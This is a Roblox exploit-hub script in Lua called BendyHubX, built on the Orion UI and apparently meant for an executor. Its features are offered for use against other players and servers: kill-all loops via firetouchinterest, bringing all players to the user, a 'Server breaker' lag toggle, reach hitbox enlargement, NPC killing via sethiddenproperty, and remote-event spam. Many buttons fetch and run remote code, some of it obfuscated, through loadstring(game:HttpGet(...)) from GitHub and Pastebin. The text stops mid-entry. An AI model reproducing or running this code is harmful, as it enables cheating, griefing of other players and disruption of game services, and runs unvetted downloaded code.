local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/ionlyusegithubformcmods/1-Line-Scripts/main/Mobile%20Friendly%20Orion')))()

local Window = OrionLib:MakeWindow({Name = "BendyHubX", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})

local Tab = Window:MakeTab({
	Name = "Main",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Section = Tab:AddSection({
	Name = "And for pvp"
})

Tab:AddDropdown({
	Name = "Tools control",
	Default = "1",
	Options = {"Equip tools", "Drop tools", "Delete tools", "Grip tools"},
	Callback = function(Value)
		if Value == "Equip tools" then
for _, tool in ipairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
     if tool:IsA("Tool") then
          tool.Parent = game:GetService("Players").LocalPlayer.Character -- I didn't use Equip because the Equip function unequips any other tools in your character.
     end
 end
end
if Value == "Drop tools" then
for i,v in pairs(game.Players.LocalPlayer.Backpack:GetDescendants()) do
   if v:IsA("Tool")  then
    v.Parent = game.Players.LocalPlayer.Character
    v.Parent = game.Workspace
end
end
end
if Value == "Delete tools" then
local Player = game:GetService("Players").LocalPlayer
local Backpack = Player.Backpack
local Character = Player.Character

for _,v in pairs(Backpack:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end
end

for _,v in pairs(Character:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end 
end
end
if Value == "Grip tools" then
  local player = game.Players.LocalPlayer
  for _, tool in ipairs(player.Backpack:GetChildren()) do
    if tool:IsA("Tool") then
      tool.GripPos = Vector3.new(math.random(-15, 30), math.random(-5, 2), math.random(-15, 30)) 
    end
  end
  wait() 
end
	end
})

Tab:AddButton({
	Name = "Multi gear",
	Callback = function()
      		lp = game:GetService("Players").LocalPlayer

game:GetService("UserInputService").InputBegan:Connect(function(key)
	if key.KeyCode == Enum.KeyCode.E then
		for i,tool in pairs(lp.Backpack:GetChildren()) do
			if tool:IsA("Tool") then
				tool.Parent = lp.Character
				tool:Activate()
				task.wait()
				tool.Parent = lp.Backpack
			end
		end
	end
end)
  	end    
})

Tab:AddButton({
	Name = "Keyboard",
	Callback = function()
      		loadstring(game:HttpGet("https://gist.githubusercontent.com/RedZenXYZ/4d80bfd70ee27000660e4bfa7509c667/raw/da903c570249ab3c0c1a74f3467260972c3d87e6/KeyBoard%2520From%2520Ohio%2520Fr%2520Fr"))()
  	end    
})

Tab:AddDropdown({
	Name = "Player mass",
	Default = "",
	Options = {"Very heavy mass", "Normal mass", "Zero mass"},
	Callback = function(Value)
		if Value == "Very heavy mass" then
		local plr = game.Players.LocalPlayer
local char = plr.Character
  
  for _, child in pairs(char:GetChildren()) do
    if child:IsA("BasePart") then
      child.Massless = false
      child.CustomPhysicalProperties = PhysicalProperties.new(math.huge, math.huge, math.huge) 
    end
  end
		end
		if Value == "Normal mass" then
		local plr = game.Players.LocalPlayer
local char = plr.Character

  for _, child in pairs(char:GetChildren()) do
    if child:IsA("BasePart") then
      child.Massless = false
      child.CustomPhysicalProperties = PhysicalProperties.new(1, 0.3, 0.5) 
    end
  end
		end
		if Value == "Zero mass" then
		local plr = game.Players.LocalPlayer
local char = plr.Character

  for _, child in pairs(char:GetChildren()) do
    if child:IsA("BasePart") then
      child.Massless = false
      child.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0) 
    end
  end
		end
	end    
})

Tab:AddDropdown({
    Name = "Mass Unanchored Objects",
    Default = "koop",
    Options = {"Very heavy parts", "Normal parts", "Very lightweight parts"},
    Callback = function(Value)
        if Value == "Very heavy parts" then
        local Players = game:GetService("Players")
local function isPartOfPlayerCharacter(part)
    for _, player in ipairs(Players:GetPlayers()) do
        local character = player.Character
        if character and part:IsDescendantOf(character) then
            return true
        end
    end
    return false
end

for _, part in ipairs(workspace:GetDescendants()) do
    if part:IsA("BasePart") and not isPartOfPlayerCharacter(part) then
        part.CustomPhysicalProperties = PhysicalProperties.new(9e999, 0, 0, 9e999, 9e999)
    end
end
        end
        if Value == "Normal parts" then
        local Players = game:GetService("Players")
local function isPartOfPlayerCharacter(part)
    for _, player in ipairs(Players:GetPlayers()) do
        local character = player.Character
        if character and part:IsDescendantOf(character) then
            return true
        end
    end
    return false
end

for _, part in ipairs(workspace:GetDescendants()) do
    if part:IsA("BasePart") and not isPartOfPlayerCharacter(part) then
        part.CustomPhysicalProperties = PhysicalProperties.new(1, 1, 1, 1, 1)
    end
end
        end
        if Value == "Very lightweight parts" then
        local Players = game:GetService("Players")
local function isPartOfPlayerCharacter(part)
    for _, player in ipairs(Players:GetPlayers()) do
        local character = player.Character
        if character and part:IsDescendantOf(character) then
            return true
        end
    end
    return false
end

for _, part in ipairs(workspace:GetDescendants()) do
    if part:IsA("BasePart") and not isPartOfPlayerCharacter(part) then
        part.CustomPhysicalProperties = PhysicalProperties.new(-9e9999, 9e9999, 0, 0, 0)
    end
end
        end
    end    
})

Tab:AddDropdown({
	Name = "Kill all versions",
	Default = "",
	Options = {"Kill all", "Multi kill all", "Anti kill friends", "Multi anti kill friends"},
	Callback = function(Value)
		if Value == "Kill all" then
		local range = 1000
local player = game:GetService("Players").LocalPlayer
game:GetService("RunService").RenderStepped:Connect(function()
    local p = game.Players:GetPlayers()
    for i = 2, #p do local v = p[i].Character
local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
            if tool and tool:FindFirstChild("Handle") then
                tool:Activate()
                for i,v in next, v:GetChildren() do
                    if v:IsA("BasePart") then
                        firetouchinterest(tool.Handle,v,0)
                        firetouchinterest(tool.Handle,v,1)
                    end
                end
            end
        end
end)

wait()

OrionLib:MakeNotification({
 Name = "BendyHubX",
 Content = "This function kills everyone sword, but works in some modes",
 Image = "rbxassetid://1633620069",
 Time = 10
})
		end
		if Value == "Multi kill all" then
		local range = 1000 -- Установка дальности действия
local player = game:GetService("Players").LocalPlayer
game:GetService("RunService").RenderStepped:Connect(function()
    local p = game.Players:GetPlayers()
    for i = 2, #p do 
        local v = p[i].Character
        if player.Character then
            for _, tool in pairs(player.Character:GetChildren()) do
                if tool:IsA("Tool") and tool:FindFirstChild("Handle") then
                    tool:Activate()
                    for _, part in pairs(v:GetChildren()) do
                        if part:IsA("BasePart") then
                            firetouchinterest(tool.Handle, part, 0)
                            firetouchinterest(tool.Handle, part, 1)
                        end
                    end
                end
            end
        end
    end
end)

wait()

OrionLib:MakeNotification({
 Name = "BendyHubX",
 Content = "This function kills everyone sword, but it works on all the tools you wear",
 Image = "rbxassetid://1633620069",
 Time = 10
})
		end
		if Value == "Anti kill friends" then
		local range = 1000
local player = game:GetService("Players").LocalPlayer

-- Функция проверки на дружбу
local function isFriendWith(player1, player2)
    return player1:IsFriendsWith(player2.UserId)
end

game:GetService("RunService").RenderStepped:Connect(function()
    local players = game.Players:GetPlayers()
    for i = 2, #players do
        local otherPlayer = players[i]
        local character = otherPlayer.Character
        -- Проверяем, не является ли игрок другом
        if not isFriendWith(player, otherPlayer) then
            local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
            if tool and tool:FindFirstChild("Handle") then
                tool:Activate()
                for _, part in next, character:GetChildren() do
                    if part:IsA("BasePart") then
                        firetouchinterest(tool.Handle, part, 0)
                        firetouchinterest(tool.Handle, part, 1)
                    end
                end
            end
        end
    end
end)

wait()

OrionLib:MakeNotification({
 Name = "BendyHubX",
 Content = "This function kills everyone sword, besides your friends",
 Image = "rbxassetid://1633620069",
 Time = 10
})
		end
		if Value == "Multi anti kill friends" then
		local range = 1000 -- Установка дальности действия
local player = game:GetService("Players").LocalPlayer
game:GetService("RunService").RenderStepped:Connect(function()
    local players = game.Players:GetPlayers()
    for i = 2, #players do 
        local otherPlayer = players[i]
        -- Проверка на дружбу
        if not player:IsFriendsWith(otherPlayer.UserId) then
            local character = otherPlayer.Character
            if character then
                local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
                for _, tool in pairs(player.Character:GetChildren()) do
                    if tool:IsA("Tool") and tool:FindFirstChild("Handle") then
                        tool:Activate()
                        for _, part in pairs(character:GetChildren()) do
                            if part:IsA("BasePart") then
                                firetouchinterest(tool.Handle, part, 0)
                                firetouchinterest(tool.Handle, part, 1)
                            end
                        end
                    end
                end
            end
        end
    end
end)

wait()

OrionLib:MakeNotification({
 Name = "BendyHubX",
 Content = "Merger *Multi kill all* and *Anti kill friends*",
 Image = "rbxassetid://1633620069",
 Time = 10
})
		end
	end    
})

Tab:AddButton({
	Name = "Telekinesis",
	Callback = function()
      		loadstring(game:HttpGet(('https://raw.githubusercontent.com/SAZXHUB/Control-update/main/README.md'),true))()
  	end    
})

Tab:AddToggle({
 Name = "Server breaker",
 Default = false,
 Callback = function(Value)
_G.Lag = Value
while _G.Lag do
for i,v in pairs(workspace:GetDescendants()) do
   if v:IsA("ClickDetector") then
    fireclickdetector(v)
   end
end
  wait(1)
  end
 end    
})

Tab:AddButton({
 Name = "Cbring",
 Callback = function()
        local plr = game:GetService("Players").LocalPlayer
for i,v in pairs(game:GetService("Players"):GetChildren()) do
    if v.ClassName == "Player" and v.Name ~= plr.Name then
        if v.Character:FindFirstChild("HumanoidRootPart") then
            v.Character.HumanoidRootPart.CFrame = CFrame.new(plr.Character.HumanoidRootPart.Position)
        end
    end
end 
   end    
})

Tab:AddTextbox({
	Name = "Reach v2",
	Default = "input",
	TextDisappear = true,
	Callback = function(Value)
for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren()) do
		if v:isA("Tool") then
			local a = Instance.new("SelectionBox",v.Handle)
			v.Handle.Massless = true
			v.Handle.Transparency = 1
			a.Adornee = v.Handle
			v.Handle.Size = Vector3.new(Value, Value, Value)
			local selectionBox = Instance.new("SelectionBox",v.Handle)
			selectionBox.Adornee = v.Handle
			selectionBox.Color3 = Color3.new(0, 0.313725, 0.47451)
		end
	end
	end	  
})

Tab:AddButton({
 Name = "Focus",
 Callback = function()
        local lp = game.Players.LocalPlayer
local mouse = lp:GetMouse()

local ft = Instance.new("Tool")
ft.Name = "Focus"
ft.RequiresHandle = false
ft.Parent = lp.Backpack
ft.Activated:Connect(function()
 local obj = mouse.Target
 if obj:IsA("BasePart") or obj:IsA("Part") or obj:IsA("MeshPart") or obj:IsA("CornerWedgePart") or obj:IsA("TrussPart") or obj:IsA("WedgePart") then
  if not obj.Anchored then
      local bambam = Instance.new("BodyAngularVelocity")
      bambam.Name = "BAM BAM AHAHHAHAHHAHAH"
      bambam.Parent = obj
      bambam.AngularVelocity = Vector3.new(99999999,99999999,99999999)
      bambam.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
      bambam.P = math.huge
     end
 end
end)
   end    
})

Tab:AddButton({
 Name = "Spin parts",
 Callback = function()
        local lp = game.Players.LocalPlayer
local mouse = lp:GetMouse()

local ft = Instance.new("Tool")
ft.Name = "Spin parts"
ft.RequiresHandle = false
ft.Parent = lp.Backpack
ft.Activated:Connect(function()
 local obj = mouse.Target
 if obj:IsA("BasePart") or obj:IsA("Part") or obj:IsA("MeshPart") or obj:IsA("CornerWedgePart") or obj:IsA("TrussPart") or obj:IsA("WedgePart") then
  if not obj.Anchored then
      local bambam = Instance.new("BodyAngularVelocity")
      bambam.Name = "BAM BAM AHAHHAHAHHAHAH"
      bambam.Parent = obj
      bambam.AngularVelocity = Vector3.new(0,26,0)
      bambam.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
      bambam.P = math.huge
     end
 end
end)
   end    
})

Tab:AddButton({
 Name = "Wheel parts",
 Callback = function()
        local lp = game.Players.LocalPlayer
local mouse = lp:GetMouse()

local ft = Instance.new("Tool")
ft.Name = "Wheel parts"
ft.RequiresHandle = false
ft.Parent = lp.Backpack
ft.Activated:Connect(function()
 local obj = mouse.Target
 if obj:IsA("BasePart") or obj:IsA("Part") or obj:IsA("MeshPart") or obj:IsA("CornerWedgePart") or obj:IsA("TrussPart") or obj:IsA("WedgePart") then
  if not obj.Anchored then
      local bambam = Instance.new("BodyAngularVelocity")
      bambam.Name = "BAM BAM AHAHHAHAHHAHAH"
      bambam.Parent = obj
      bambam.AngularVelocity = Vector3.new(1,1,6)
      bambam.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
      bambam.P = math.huge
     end
 end
end)
   end    
})

Tab:AddButton({
 Name = "Kill all npcs",
 Callback = function()
        sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", 112412400000)
sethiddenproperty(game.Players.LocalPlayer, "MaxSimulationRadius", 112412400000)
for i, d in pairs(game.Workspace:GetDescendants()) do
    if d.ClassName == 'Humanoid' and not game.Players:FindFirstChild(d.Parent.Name) then
        d.Health = 0
    end
end
   end    
})

Tab:AddButton({
 Name = "Refresh",
 Callback = function()
        last_pick_sin_mrazy = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
wait()
game:GetService("Players").LocalPlayer.Character.Humanoid.Health = 0 
wait(3.5)
game. Players.LocalPlayer.Character.HumanoidRootPart.CFrame = last_pick_sin_mrazy
   end    
})

local Section = Tab:AddSection({
	Name = "modification of other items"
})

local Section = Tab:AddSection({
	Name = "Milk tool"
})

Tab:AddButton({
 Name = "Spam sounds",
 Callback = function()
        while wait ()  do
game:GetService("Players").LocalPlayer.Character:FindFirstChild("milk tool").specialdelivery:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Bombing",
 Callback = function()
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "milk tool" then
       v.Parent = LP.Character
   end
end

while true do
wait(0.1)
local mouse = game:GetService("Players").LocalPlayer:GetMouse()
local clickPosition = mouse.Hit.Position

local args = {
    [1] = CFrame.new(clickPosition),
    [2] = Vector3.new(clickPosition),
    [3] = false
}

game:GetService("Players").LocalPlayer.Character:FindFirstChild("milk tool").SpawnGrenade:FireServer(unpack(args))
end
end
})

local Section = Tab:AddSection({
	Name = "Cola v7"
})

Tab:AddButton({
 Name = "Get cola",
 Callback = function()
        last_pick_sin_mrazy = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame 

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-23, 52, -57)
task.wait()
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
local actionRadius = 2

game:GetService("CoreGui").PurchasePrompt.Enabled = false

for i, v in pairs(workspace:GetDescendants()) do
    if v:IsA("ClickDetector") then
        local objectPosition = v.Parent.Position
        local playerPosition = humanoidRootPart.Position
        local distance = (objectPosition - playerPosition).magnitude 

        if distance <= actionRadius then
            fireclickdetector(v)
        end
    end
end
task.wait(0.1)
for i = 1, 10 do
    wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-25, 56, -58)
end
task.wait(0.1)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-25, 50, -58)
task.wait(0.1)
game. Players.LocalPlayer.Character.HumanoidRootPart.CFrame = last_pick_sin_mrazy
   end    
})

Tab:AddButton({
 Name = "Bombing",
 Callback = function()
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "cola v7" then
       v.Parent = LP.Character
   end
end

while true do
wait(0.1)
    local mouse = game:GetService("Players").LocalPlayer:GetMouse()
local clickPosition = mouse.Hit.Position

local args = {
    [1] = CFrame.new(clickPosition),
    [2] = Vector3.new(clickPosition),
    [3] = false
}

game:GetService("Players").LocalPlayer.Character:FindFirstChild("cola v7").SpawnGrenade:FireServer(unpack(args))
end
end
})

local Section = Tab:AddSection({
	Name = "Energy bomb"
})

Tab:AddButton({
 Name = "Ultimate Accumulation",
 Callback = function()
        while wait(0.1) do
game:GetService("Players").LocalPlayer.Character.EnergyBomb.StartCharge:FireServer()
end
   end    
})

local Section = Tab:AddSection({
	Name = "Wise Mystical"
})

Tab:AddButton({
 Name = "God of the forest",
 Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/BendyHubX_TreeTool/main/ScriptFE"))()
        Spooky = Instance.new("Sound", game.Workspace)
Spooky.Name = "GODOFTREE"
Spooky.SoundId = "rbxassetid://4485011313"
Spooky.Volume = 2
Spooky.PlaybackSpeed = 1
Spooky.Looped = false
Spooky:Play()
OrionLib:MakeNotification({
	Name = "BendyHubX",
	Content = "To change the mode write to chat /toolmode2(1-4)",
	Image = "rbxassetid://4483345998",
	Time = 5
})
   end
})

Tab:AddDropdown({
	Name = "Invisible mod switch",
	Default = "1",
	Options = {"toolmode1", "toolmode2", "toolmode3", "toolmode4"},
	Callback = function(value)
if value == "toolmode1" then
		game.Players:Chat("/toolmode1")
	elseif value == "toolmode2" then
	    game.Players:Chat("/toolmode2")
	elseif value == "toolmode3" then
	    game.Players:Chat("/toolmode3")
	elseif value == "toolmode4" then
	    game.Players:Chat("/toolmode4")
end
	end    
})

local Tab = Window:MakeTab({
	Name = "Teleport",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddButton({
	Name = "Spawn",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-19.2736759185791, 47.2499885559082, -95.39224243164062)
  	end    
})

Tab:AddButton({
	Name = "Armory v1",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-28.092544555664062, 47.2499885559082, -58.13669967651367)
  	end    
})

Tab:AddButton({
	Name = "Armory v2",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-9.907795906066895, 47.2499885559082, -54.53683853149414)
  	end 
})

Tab:AddButton({
        Name = "Armory v3",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-28.757802963256836, 47.2499885559082, 23.287477493286133)
  	end    
})

Tab:AddButton({
	Name = "Armory v4",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-11.947197914123535, 47.2499885559082, 23.31879425048828)
  	end    
})

local Tab = Window:MakeTab({
	Name = "Misc",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddTextbox({
	Name = "Animation loader",
	Default = "input",
	TextDisappear = true,
	Callback = function(Value)
		local Anim = Instance.new("Animation")
Anim.AnimationId = Value
local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
k:Play()
k:AdjustSpeed(1)
	end	  
})

Tab:AddTextbox({
	Name = "Teleport CFrame",
	Default = "input",
	TextDisappear = true,
	Callback = function(Value)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Value)
	end	  
})

Tab:AddTextbox({
	Name = "SMS",
	Default = "input",
	TextDisappear = true,
	Callback = function(Value)
		local msg = Instance.new("Message",workspace)
msg.Text = Value
wait(5.8)
msg:Destroy()
	end	  
})

Tab:AddTextbox({
	Name = "Spin",
	Default = "input",
	TextDisappear = true,
	Callback = function(Value)
		local spinSpeed = Value
local Spin = Instance.new("BodyAngularVelocity")
Spin.Name = "Spinning"
Spin.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
Spin.MaxTorque = Vector3.new(0, math.huge, 0)
Spin.AngularVelocity = Vector3.new(0,spinSpeed,0)
	end	  
})

Tab:AddTextbox({
	Name = "Time set",
	Default = "input",
	TextDisappear = true,
	Callback = function(Value)
		game.Lighting.TimeOfDay = Value
	end	  
})

Tab:AddTextbox({
	Name = "Parts",
	Default = "input color",
	TextDisappear = true,
	Callback = function(Value)
		for _, part in ipairs(workspace:GetDescendants()) do
        if part:IsA("BasePart") then
            local r = Value
            local g = Value
            local b = Value
            part.BrickColor = BrickColor.new(Color3.new(r, g, b))
        end
    end
	end	  
})

Tab:AddTextbox({
	Name = "Copy text",
	Default = "input",
	TextDisappear = true,
	Callback = function(Value)
		setclipboard(Value)
	end	  
})

Tab:AddTextbox({
	Name = "SMS v2",
	Default = "input",
	TextDisappear = true,
	Callback = function(Value)
		game.StarterGui:SetCore( "ChatMakeSystemMessage",  { Text = Value, Color = Color3.fromRGB( 255,0,0 ), Font = Enum.Font.Arial } )
	end	  
})

local Section = Tab:AddSection({
	Name = "Fly"
})

Tab:AddButton({
	Name = "Fly",
	Callback = function()
      		loadstring(game:HttpGet("https://pastebin.com/raw/TCHpDrRr"))()
  	end    
})

Tab:AddButton({
	Name = "Fly v3",
	Callback = function()
      		loadstring(game:HttpGet('https://pastebin.com/raw/YSL3xKYU'))()
  	end    
})

Tab:AddButton({
	Name = "CFrame fly",
	Callback = function()
      		loadstring(game:HttpGet(('https://pastebin.com/raw/YvKv4AuY'),true))()
  	end    
})

Tab:AddButton({
	Name = "Fly car",
	Callback = function()
      		loadstring(game:HttpGet("https://pastebin.com/raw/MHE1cbWF"))()
  	end    
})

local Section = Tab:AddSection({
	Name = "Fling"
})

Tab:AddButton({
	Name = "Dino with fling",
	Callback = function()
      		loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_K2n31uc6t2wY5A8786eR4K15sgbUF0vdQ80a0LzgvLRkSNYd89H1AS3124gMR6SM.lua.txt'),true))()
  	end    
})

Tab:AddButton({
	Name = "Click fling",
	Callback = function()
      		loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_5wpM7bBcOPspmX7lQ3m75SrYNWqxZ858ai3tJdEAId6jSI05IOUB224FQ0VSAswH.lua.txt'),true))()
  	end    
})

Tab:AddButton({
	Name = "Fe yeet",
	Callback = function()
      		loadstring(game:HttpGet('https://pastebin.com/raw/dg5QJga2'))()
  	end    
})

local Section = Tab:AddSection({
	Name = "ESP"
})

Tab:AddButton({
	Name = "ESP",
	Callback = function()
      		loadstring(game:HttpGet("https://pastebin.com/raw/AFGfwLgQ"))()
  	end    
})

Tab:AddButton({
	Name = "ESP v2",
	Callback = function()
      		loadstring(game:HttpGet('https://raw.githubusercontent.com/fatesc/fates-esp/main/main.lua'))()
  	end    
})

local Tab = Window:MakeTab({
	Name = "Bendy Scripts",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddDropdown({
	Name = "Bazooka",
	Default = "1",
	Options = {"Bazooka Minigun", "Death Explosion"},
	Callback = function(Value)
		if Value == "Bazooka Minigun" then
		while true do wait()
local player = game.Players.LocalPlayer
  local mouse = player:GetMouse()
    local targetPosition = mouse.Hit.Position
local args = {
    [1] = Vector3.new(targetPosition.X, targetPosition.Y, targetPosition.Z)
}

game:GetService("Players").LocalPlayer.Character.Bazooka.Shoot:FireServer(unpack(args))
end
		end
		if Value == "Death Explosion" then
		local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Bazooka" then
       v.Parent = LP.Character
   end
end

wait(0.5)

local args = {
    [1] = "Radius",
    [2] = 9e99 * 9e99 * 9e9999
}

game:GetService("Players").LocalPlayer.Character.Bazooka.ChangeValue:FireServer(unpack(args))
		end
	end    
})

Tab:AddDropdown({
	Name = "Quake Hammer",
	Default = "1",
	Options = {"Spam Earthquake"},
	Callback = function(Value)
		if Value == "Quake Hammer" then
		while true do wait(.1)
local player = game.Players.LocalPlayer
  local mouse = player:GetMouse()
    local targetPosition = mouse.Hit.Position
local args = {
    [1] = Vector3.new(targetPosition.X, targetPosition.Y, targetPosition.Z),
    [2] = workspace:WaitForChild("Basecharcha1")
}

game:GetService("Players").LocalPlayer.Character:FindFirstChild("Quake Hammer").Attack:FireServer(unpack(args))
end
		end
	end    
})

Tab:AddDropdown({
	Name = "Winning Knife",
	Default = "1",
	Options = {"Spam Throw", "Spam Barrage", "Laugh"},
	Callback = function(Value)
		if Value == "Spam Throw" then
		while true do wait()
local player = game.Players.LocalPlayer
  local mouse = player:GetMouse()
    local targetPosition = mouse.Hit.Position
local args = {
    [1] = Vector3.new(targetPosition.X, targetPosition.Y, targetPosition.Z)
}

game:GetService("Players").LocalPlayer.Character:FindFirstChild("Winning Knife").Throw:FireServer(unpack(args))
end
		end
		if Value == "Spam Barrage" then
		while true do wait()
local player = game.Players.LocalPlayer
  local mouse = player:GetMouse()
    local targetPosition = mouse.Hit.Position
local args = {
    [1] = Vector3.new(targetPosition.X, targetPosition.Y, targetPosition.Z)
}

game:GetService("Players").LocalPlayer.Character:FindFirstChild("Winning Knife").Barrage:FireServer(unpack(args))
end
		end
		if Value == "Laugh" then
		game:GetService("Players").LocalPlayer.Backpack["Winning Knife"].Emote:FireServer()
		end
	end    
})

Tab:AddDropdown({
	Name = "Tree Tool",
	Default = "1",
	Options = {"Spam Trees", "Super Wise Mystical"},
	Callback = function(Value)
		if Value == "Spam Trees" then
		while true do wait()
local player = game.Players.LocalPlayer
  local mouse = player:GetMouse()
    local targetPosition = mouse.Hit.Position
local args = {
    [1] = Vector3.new(targetPosition.X, targetPosition.Y, targetPosition.Z)
}

game:GetService("Players").LocalPlayer.Character:FindFirstChild("Wise Mystical Tree").Create:FireServer(unpack(args))
end
		end
		if Value == "Super Wise Mystical" then
		while wait() do
a = math.random(-300, 300)
b = math.random(-50, 100)
c = math.random(-300, 300)
local args = {
    [1] = Vector3.new(a, b, c)
}

game:GetService("Players").LocalPlayer.Character:FindFirstChild("Wise Mystical Tree").Create:FireServer(unpack(args))
end
		end
	end    
})

Tab:AddDropdown({
	Name = "Uncanny Bombs",
	Default = "1",
	Options = {"Spam Uncanny", "Spam Canny", "Spam Supercanny", "Supernova technique"},
	Callback = function(Value)
		if Value == "Spam Uncanny" then
		while true do wait()
local player = game.Players.LocalPlayer
  local mouse = player:GetMouse()
    local targetPosition = mouse.Hit.Position
local args = {
    [1] = Vector3.new(targetPosition.X, targetPosition.Y, targetPosition.Z),
    [2] = "uncanny"
}

game:GetService("Players").LocalPlayer.Character:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
end
		end
		if Value == "Spam Canny" then
		while true do wait()
local player = game.Players.LocalPlayer
  local mouse = player:GetMouse()
    local targetPosition = mouse.Hit.Position
local args = {
    [1] = Vector3.new(targetPosition.X, targetPosition.Y, targetPosition.Z),
    [2] = "canny"
}

game:GetService("Players").LocalPlayer.Character:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
end
		end
		if Value == "Spam Supercanny" then
		while true do wait()
local player = game.Players.LocalPlayer
  local mouse = player:GetMouse()
    local targetPosition = mouse.Hit.Position
local args = {
    [1] = Vector3.new(targetPosition.X, targetPosition.Y, targetPosition.Z),
    [2] = "supercanny"
}

game:GetService("Players").LocalPlayer.Character:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
end
		end
		if Value == "Supernova technique" then
		local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Uncanny Bombs" then
       v.Parent = LP.Character
   end
end
        while game:GetService("RunService").RenderStepped:wait() do
a = math.random(-300, 300)
b = math.random(-50, 100)
c = math.random(-300, 300)
local args = {
    [1] = Vector3.new(a, b, c),
    [2] = "supercanny"
}

game:GetService("Players").LocalPlayer.Character:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
end
		end
	end    
})

Tab:AddDropdown({
	Name = "Ghosting Bomb",
	Default = "1",
	Options = {"Spam Ghosting Bomb"},
	Callback = function(Value)
		if Value == "Spam Ghosting Bomb" then
		local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "GhostlyV low cds" then
       v.Parent = LP.Character
   end
end
    local mouse = game:GetService("Players").LocalPlayer:GetMouse()
local clickPosition = mouse.Hit.Position
        while wait() do
local args = {
    [1] = Vector3.new(clickPosition.X, clickPosition.Y, clickPosition.Z)
}

game:GetService("Players").LocalPlayer.Character:FindFirstChild("GhostlyV low cds").Summon:FireServer(unpack(args))
end
		end
	end    
})

Tab:AddDropdown({
	Name = "Guardians",
	Default = "1",
	Options = {"Spam Guardians"},
	Callback = function(Value)
		if Value == "Spam Guardians" then
		local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Bodyguards" then
       v.Parent = LP.Character
   end
end

local mouse = game:GetService("Players").LocalPlayer:GetMouse()
local targetPosition = mouse.Hit.Position
 while wait() do
        local args = {
    [1] = Vector3.new(targetPosition.X, targetPosition.Y, targetPosition.Z)
}

game:GetService("Players").LocalPlayer.Character.Bodyguards.Summon:FireServer(unpack(args))
end
		end
	end    
})

Tab:AddDropdown({
	Name = "Forcefield",
	Default = "1",
	Options = {"Resize Forcefield", "Damage mode", "Knockback mode"},
	Callback = function(Value)
		if Value == "Resize Forcefield" then
		while wait() do
local args = {
    [1] = "positive"
}

game:GetService("Players").LocalPlayer.Character:FindFirstChild("Forcefield Generator").Resize:FireServer(unpack(args))
end
		end
		if Value == "Damage mode" then
		local args = {
    [1] = true
}

game:GetService("Players").LocalPlayer.Character:FindFirstChild("Forcefield Generator").Switch:FireServer(unpack(args))
		end
		if Value == "Knockback mode" then
		local args = {
    [1] = false
}

game:GetService("Players").LocalPlayer.Character:FindFirstChild("Forcefield Generator").Switch:FireServer(unpack(args))
		end
	end    
})

Tab:AddDropdown({
	Name = "Stop Time",
	Default = "1",
	Options = {"Stop Time"},
	Callback = function(Value)
	if Value == "Stop Time" then
		local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Timestop" then
       v.Parent = LP.Character
   end
end
game:GetService("Players").LocalPlayer.Character.Timestop.Stop:FireServer()
  end
	end    
})

Tab:AddDropdown({
	Name = "Demonic Duck",
	Default = "1",
	Options = {"Kill All"},
